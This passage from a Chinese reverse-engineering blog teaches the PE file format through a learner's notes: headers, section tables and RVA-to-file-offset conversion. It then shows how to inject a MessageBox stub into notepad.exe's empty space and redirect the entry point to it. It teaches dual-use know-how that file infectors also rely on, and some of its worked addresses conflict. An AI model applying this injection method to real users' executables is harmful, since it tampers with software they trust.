class="number">256</span>;</span><br><span class="line">    Swap(&amp;S[i],&amp;S[j]);</span><br><span class="line">    t=(S[i]+S[j])%<span class="number">256</span>;</span><br><span class="line">    <span class="type">int</span> k=S[t];</span><br><span class="line">    data[m]^=k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,data[m]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>验证一下成果</p>
<p><img src="/2023/08/20/RC4/QQ%E6%88%AA%E5%9B%BE20230729234509.png"></p>
<p><img src="/2023/08/20/RC4/QQ%E6%88%AA%E5%9B%BE20230729234535.png"></p>
<p>okk。</p>
<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a><strong>特征</strong></h2><p>总结一下，如何在茫茫人海中一眼认出RC4？<strong>256位的数组</strong>，<strong>交换函数</strong>，异或，over。</p>
<p>手写一遍之后以后遇到魔改的RC4应该就能拿捏了。</p>
]]></content>
      <tags>
        <tag>密码学</tag>
        <tag>对称加密</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件学习篇</title>
    <url>/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/</url>
    <content><![CDATA[<p>在《逆向工程核心原理》这本书接触到了PE文件，但是当时学不进去，感觉很晦涩，虽然是一个结构体一个结构体的进行分析，但还是掌握不了。今天在YouTube上找到了一个视频，看了一下有种恍然大明白的感觉。正巧今天看了一期关于国产大飞机C919的视频很有感想，我们的策略是先整体后局部，即不过分死抠细节，不把国产化率排在首位，先造出来一个大飞机，于是我们就有了一张蓝图，知道方向在哪里。学习PE文件这里也是，先整体的过一遍，知道个轮廓，在学起来会容易和有趣不少。</p>
<span id="more"></span>

<p>强烈推荐这个<a href="https://www.youtube.com/watch?v=oSpeXGHaKAk&t=15123s">PE教程</a></p>
<h2 id="PE基础"><a href="#PE基础" class="headerlink" title="PE基础"></a>PE基础</h2><h3 id="PE文件概念"><a href="#PE文件概念" class="headerlink" title="PE文件概念"></a>PE文件概念</h3><p>PE文件(Portable Executable file)，是一种可执行文件格式，满足此格式的文件都可以在Windows操作系统运行。在Linux系统运行的文件是ELF。</p>
<h4 id="识别PE文件"><a href="#识别PE文件" class="headerlink" title="识别PE文件"></a>识别PE文件</h4><p>通过后缀名判断文件格式是不靠谱的，因为后缀名是可以随意更改的，我们用一个十六进制编辑器打开一个文件，如果他的开头是MZ，且0x3c–0x3f所指示的偏移地址处的值是PE那么我们几乎可以肯定这是个PE文件。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608020344.png"></p>
<h3 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h3><p>从DOS头到节区头是PE头部分，其下的节区合成PE体。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608015737.png"></p>
<p>来几张高清大图</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/1379525-20191026162607168-1322217015.jpg"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/1379525-20191026162634249-935893360.jpg"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/1379525-20191030090458584-97459483.jpg"></p>
<p>我们学习PE文件就是学习这些结构体，先对结构体来个介绍。我们可以通过PEView查看pe文件，将notepad.exe拖入。我们先来分析一下存储时的PE文件，没错PE文件运行时和在硬盘中存储时是不同的。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608021806.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608022014.png"></p>
<h3 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h3><p><strong>DOS部分</strong>（早期为了兼容DOS所设计）</p>
<ul>
<li><p><strong>IMAGE_DOS_HEADER</strong>(64字节)<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608022309.png"></p>
</li>
<li><p><strong>MS_DOS Stu</strong>，DOS存根，大小是不固定的，链接器会在这里插入数据，不影响程序运行，病毒程序可以插入在这里。虽然倒下不固定，但我们可以通过IMAGE_DOS_HEADER结构体的最后一个成员PE头开始的位置，用这个值减去64即DOS存根的大小。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608023411.png"></p>
</li>
<li><p>​</p>
</li>
</ul>
<p><strong>PE文件头</strong></p>
<ul>
<li><p><strong>IMAGE_NT_HEADERS</strong>即PE头结构体，包括三个部分<strong>PE标识</strong>，<strong>标准PE头</strong>，<strong>扩展PE头</strong><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608024443.png"></p>
</li>
<li><p><strong>IMAGE_FILE_HEADER</strong>(20字节)<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608025007.png"></p>
</li>
<li><p><strong>IMAGE_OPTIONAL_HEADER</strong>（32位）(224字节)（可扩展），IMAGE_FILE_HEADER结构体的一个成员记录该结构体的大小。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608025535.png"></p>
</li>
</ul>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608025929.png"></p>
<p><strong>节表</strong> （记录节的信息）</p>
<ul>
<li><p><strong>IMAGE_SECTION_HEADER</strong> (40字节)</p>
<p>有几个节区就有几个这样的结构体</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608030333.png"></p>
</li>
</ul>
<p>​        IMAGE_SECTION_HEADER .text<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608030430.png"></p>
<p>节表后面是一些意义不大的数据，我们可以有效利用这些空间，所以节表和节表数据是不相邻的。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608030736.png"></p>
<p>在可选头结构体中有一个成员记录<strong>PE头</strong>(DOS头+PE文件头+节表)的大小<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608031239.png"></p>
<h4 id="文件对齐"><a href="#文件对齐" class="headerlink" title="文件对齐"></a>文件对齐</h4><p>大小要满足是最小单位的整数倍，这样做可以提高效率。牺牲一定空间换取时间。节数据也要满足文件对齐。文件对齐上面的成员记录着内存对齐的大小，即程序加载到内存中后的对齐单位<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608034852.png"></p>
<h4 id="PE文件有两种状态："><a href="#PE文件有两种状态：" class="headerlink" title="PE文件有两种状态："></a>PE文件有两种状态：</h4><p>磁盘状态（存储）</p>
<p>内存状态（运行）</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608032628.png"></p>
<h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h4><p>Q:为什么文件对齐参数与内存对齐参数不相同？</p>
<p>A:因为它们分别用于优化文件I&#x2F;O和虚拟内存管理。</p>
<h3 id="DOS头属性说明"><a href="#DOS头属性说明" class="headerlink" title="DOS头属性说明"></a>DOS头属性说明</h3><p>IMAGE_DOS_HEADER结构体是为了早期16位程序而准备的，现在已经弃用除了头尾两个成员，其余的都是可以更改的<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608040613.png"></p>
<p>更改之后不影响程序运行。</p>
<h3 id="PE头属性说明"><a href="#PE头属性说明" class="headerlink" title="PE头属性说明"></a>PE头属性说明</h3><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608024443.png"></p>
<h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>4个字节的签名。更改之后不可运行。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608141251.png"></p>
<h4 id="IMAGE-FILE-HEADER-（标准PE头）"><a href="#IMAGE-FILE-HEADER-（标准PE头）" class="headerlink" title="IMAGE_FILE_HEADER   （标准PE头）"></a>IMAGE_FILE_HEADER   （标准PE头）</h4><p>长度20字节。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608140246.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608140218.png"></p>
<h5 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a><strong>Machine</strong></h5><p>两个字节，标记可以程序可以运行在什么样的CPU上。                                                           任意：<strong>0</strong> ；Intel 386以及后续：<strong>14C</strong>；x64：<strong>8664</strong></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608141338.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608141402.png"></p>
<h5 id="Number-of-Section"><a href="#Number-of-Section" class="headerlink" title="Number of Section"></a>Number of Section</h5><p>两个字节记录节的数目。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608141938.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608142002.png"></p>
<h5 id="TimeDateStamp"><a href="#TimeDateStamp" class="headerlink" title="TimeDateStamp"></a>TimeDateStamp</h5><p>时间戳，四个字节，在我的工具尚未能显示，我没有权限。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608142256.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608142319.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143400.png"></p>
<p>程序的时间戳是指在Windows操作系统上编译或链接可执行文件时，由编译器或链接器自动插入的一个时间戳。它通常存储为32位无符号整数，表示从1970年1月1日00:00:00（格林威治时间）开始的秒数。可以更改。</p>
<h5 id="Pointer-to-Symbol-Table-amp-Number-of-Symbol"><a href="#Pointer-to-Symbol-Table-amp-Number-of-Symbol" class="headerlink" title="Pointer to Symbol Table &amp;Number of Symbol"></a>Pointer to Symbol Table &amp;Number of Symbol</h5><p>调试相关，不关注，共8个字节<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143227.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143423.png"></p>
<h5 id="Size-of-Optional-Header"><a href="#Size-of-Optional-Header" class="headerlink" title="Size of Optional  Header"></a>Size of Optional  Header</h5><p>两个字节，因为可选头长度是不固定的，该成员记录MAGE_OPTIONAL_HEADER的大小，32位默认是0xE0,64位默认是0xF0。如果可选头长度更改，也要对应修改这里。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143754.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143744.png"></p>
<h5 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h5><p>两个字节，记录文件属性<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608145505.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608145426.png"></p>
<p>010F –&gt;0000 0001 0000 1111,每一个位都有意义，比如下标为1的地方是1，那么代表该文件是可执行文件。</p>
<h4 id="IMAGE-OPTIONAL-HEADER-（扩展PE头）"><a href="#IMAGE-OPTIONAL-HEADER-（扩展PE头）" class="headerlink" title="IMAGE_OPTIONAL_HEADER （扩展PE头）"></a>IMAGE_OPTIONAL_HEADER （扩展PE头）<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608150619.png"></h4><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608151039.png"></p>
<h5 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h5><p>两个字节，标志程序是32位还是64位（最准确）。PE32：10B ；PE32+:20B<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608151300.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608151311.png"></p>
<h5 id="Address-of-Entry-Point"><a href="#Address-of-Entry-Point" class="headerlink" title="Address of Entry Point"></a>Address of Entry Point</h5><p>4个字节，程序的入口。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608151717.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608153437.png"></p>
<p>记录代码开始的位置，记录的是相对Image Base的距离。PE文件在内存中展开后最前面都是数据，需要一个值告诉操作系统从哪里开始运行。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608154414.png"></p>
<p>那么么该程序就从01000000+0000739D&#x3D;0100739D,     OD会在程序开始设置一个断点，地址就是这里。对这里进行修饰会增加逆向分析的难度，因为调试机器找不到程序入口。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608154708.png"></p>
<h5 id="Image-Base"><a href="#Image-Base" class="headerlink" title="Image Base"></a>Image Base</h5><p>4字节，<strong>内存</strong>镜像基址。对于32位机器，操作系统会位每个进程分配一个4GB的虚拟地址空间，之所以是4GB，是因为32位操作系统指针长度为4字节32为，所以寻址能力是2的32次方。该成员指明程序在虚拟地址空间的何处展开，即基地址。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608152911.png"></p>
<h5 id="Section-Alignment"><a href="#Section-Alignment" class="headerlink" title="Section Alignment"></a>Section Alignment</h5><p>内存对齐大小。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608155130.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608155207.png"></p>
<h5 id="File-Alignment"><a href="#File-Alignment" class="headerlink" title="File Alignment"></a>File Alignment</h5><p>文件对齐大小。</p>
<h5 id="Size-of-Image"><a href="#Size-of-Image" class="headerlink" title="Size of Image"></a>Size of Image</h5><p>文件在内存中展开时的大小。</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608195924.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608200001.png"></p>
<h5 id="Size-of-Header"><a href="#Size-of-Header" class="headerlink" title="Size of Header"></a>Size of Header</h5><p>四字节，所有头+节表按照文件对齐后的大小。</p>
<h5 id="Checksum"><a href="#Checksum" class="headerlink" title="Checksum"></a>Checksum</h5><p>校验和，以两字节为单位，将所有的数据相加。用来判断程序是否受到修改，但是我们可以通过修改其他数值来平衡，所以意义不大。</p>
<h3 id="PE节表"><a href="#PE节表" class="headerlink" title="PE节表"></a>PE节表</h3><p>学习节表之前首先要知道PE文件的两种状态</p>
<p>即<strong>文件</strong>状态和<strong>内存</strong>状态<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608214913.png"></p>
<p>节表以结构体的形式描述节的信息，每个节表40字节<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608213320.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608214948.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608213615.png"></p>
<h5 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h5><p>8字节，当前节的名字，可以随意更改。</p>
<h5 id="Vitual-Size"><a href="#Vitual-Size" class="headerlink" title="Vitual Size"></a>Vitual Size</h5><p>当前这个节未对齐时的大小，即实际大小。实际大小有可能会比Size of Raw Data大，因为未初始化的全局变量在文件中是不占空间的。在内存中展开时以什么为基准呢？答案是谁大按谁，如果Vitual Size&gt;Size of Raw Data,则按照Vitual Size展开，反之则按照Size of Raw Data。</p>
<h5 id="VirtualAddress"><a href="#VirtualAddress" class="headerlink" title="VirtualAddress"></a>VirtualAddress</h5><p>在内存中的偏移地址，加上ImageBase则是内存中的真实地址。</p>
<h5 id="Size-of-Raw-Data"><a href="#Size-of-Raw-Data" class="headerlink" title="Size of Raw Data"></a>Size of Raw Data</h5><p>文件对齐后的大小，Vitual Size的值是7748，文件对其大小是100，Size of Raw Data的值为7800。</p>
<h5 id="Pointer-to-Raw-Data"><a href="#Pointer-to-Raw-Data" class="headerlink" title="Pointer to Raw Data"></a>Pointer to Raw Data</h5><p>当前节在文件中从何处开始<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608221450.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608221509.png"></p>
<h5 id="Charactenstics"><a href="#Charactenstics" class="headerlink" title="Charactenstics"></a>Charactenstics</h5><p>四字节，节的属性。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609012703.png"></p>
<p>60 00 00 20 –&gt;0110 0000 0000 0000 0000 0000 0010 0000<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609013111.png"></p>
<p>可以看到下标为5的位是1，代表该节中含有代码。</p>
<h3 id="RVA与FOA的转换"><a href="#RVA与FOA的转换" class="headerlink" title="RVA与FOA的转换"></a>RVA与FOA的转换</h3><p>用一个简单的程序开始RVA.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c = <span class="number">123456</span>;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;全局变量的地址是：%p\n&quot;</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;全局变量的值是：%d\n&quot;</span>, c);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们的任务是通过地址找到该全局变量，然后改变它的值。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609022947.png"></p>
<p>我们运行程序，看到其地址是00bca000，这是在内存中的地址，我们知道PE文件在内存中和在文件中展开是不一样的，我们就是要通过内存中的这个地址找到文件中对应的位置。</p>
<h4 id="RVA"><a href="#RVA" class="headerlink" title="RVA"></a>RVA</h4><p>相对虚拟地址(Relative virtual address) <strong>RVA</strong>&#x3D;内存地址-ImageBase <img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609023025.png"></p>
<p>查看其Image Base得到 RVA&#x3D;D0A000-400000&#x3D;90 A000</p>
<h4 id="FOA"><a href="#FOA" class="headerlink" title="FOA"></a>FOA</h4><p>文件偏移地址(File offset address) <strong>FOA</strong></p>
<h4 id="转换过程"><a href="#转换过程" class="headerlink" title="转换过程"></a>转换过程</h4><ol>
<li>判断RVA是否在PE头部，如果在则<strong>RVA&#x3D;FOA</strong>，因为头部没有被拉伸</li>
<li>如果不在头部，判断RVA位于哪个节中 ，求出 差值&#x3D;RVA-节.VA,也就是该地址相对节头的距离。为什么要求差值？因为在文件和在内存中差值是相同的。                           FOA&#x3D;节.PointerToData+差值</li>
</ol>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609212516.png"></p>
<p>他的位置是在00CAA000处，这里的位置即内存中的位置，不用想，他肯定不在头中。我们必须将运行中的程序进行分析，因为基地址也是随机化的。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609212915.png"></p>
<p>Image Base&#x3D;00C90000，全局变量的地址是00CAA000<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609213106.png"></p>
<p>此处的RVA即在文件中的偏移量，由此我们确定全局变量在data节中，差值为0，那么我们查看该节在文件中的位置即Point to Raw Data&#x3D;8000.跳转到此处，其值为0001E240即十六进制的123456<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609213538.png"></p>
<p>修改并保存<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609213626.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609213703.png"></p>
<p>我大为震惊。其实这个过程遇到了很多麻烦，基地址随机是在这个过程中认识到的。这个过程挺美妙的，虽然是个很简单的东西，却体现出了逆向的的思想与魅力。</p>
<h2 id="修改PE文件"><a href="#修改PE文件" class="headerlink" title="修改PE文件"></a>修改PE文件</h2><h3 id="在空白区域添加代码"><a href="#在空白区域添加代码" class="headerlink" title="在空白区域添加代码"></a>在空白区域添加代码</h3><p>我们要插入这样一个代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610021138.png"></p>
<p>功能呢就是弹出一个这样的错误窗口。这个程序的核心就是调用了一个messagebox函数弹出了一个窗口。由于我们是要对pe文件进行操作，所以肯定不是将代码写入，而是要将机器码插入。就是利于栈传第四个参数0，然后call。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610021641.png"></p>
<ol>
<li><p>构造要写入的代码 6A 00 6A 00 6A 00 6A 00 E8（call）xx xx，我们看到的FF是(near jump)要使用一个什么导入表（后面会学），而我们插入的时候E8利用相对便宜量调用函数。E8后面跟四个字节的相对偏移量offset，怎么计算？还好了解过汇编，offset&#x3D;要跳转的地方的地址-call指令下面一条指令的地址。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610022933.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610023052.png"></p>
<p>将图一标记位置改为call 1c1023 得到图二，后面的0A&#x3D;1c1023-1c1019.我们的目标指示让他弹出窗口，不能破坏程序运行，所以弹出之后我们还要跳回到初始位置，让程序正常运行，我们使用JMP（E9）指令来实现该操作，E9后面也是跟偏移量，用法与E8相同。找到messagebox的地址75858A70。根据call指令的位置来计算。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610031033.png"></p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610031802.png"></p>
<p>E8所在的位置是3A8，这是文件中的位置，我们要考虑的是运行时的位置，所以要把这个地址加上Image Base &#x3D;01000000,所以最后得到的                                    offset&#x3D;75858A70-010003A8-5&#x3D;7485 86C3.最后跳转到程序的入口处，查看可选头的成员入口值为739D加上Image Base得到0100739D.                                  offset&#x3D;0100739D-010003AD-5&#x3D;6FEB<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610034056.png"></p>
</li>
<li><p>将程序入口点指向我们插入的代码，</p>
<p>也就是修改扩展pe头里的入口值</p>
<p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610034457.png"></p>
</li>
</ol>
<p>在108处占4个字节，我们插入的程序起始位置是000003A0.然后，然后就没然后了，程序运行不起，ida和od看到的东西都很奇怪，延误了两天，这里我直接说一下才的坑，我随意找了一个空白处填充机器码，但后来发现不是所有的位置都能发生跳转，然后就将指令插入在了text段的末尾，然后发现跳转的有些差异，不会跳转在我设置的地方，后知后觉的发现，视频里的老哥演示的的时候拿的是一个文件对齐和内存对齐相同大小的程序，我用的程序是一个不同的，所以就要计算一下 用我们前面学习到的知识。下面理一下步骤</p>
<ol>
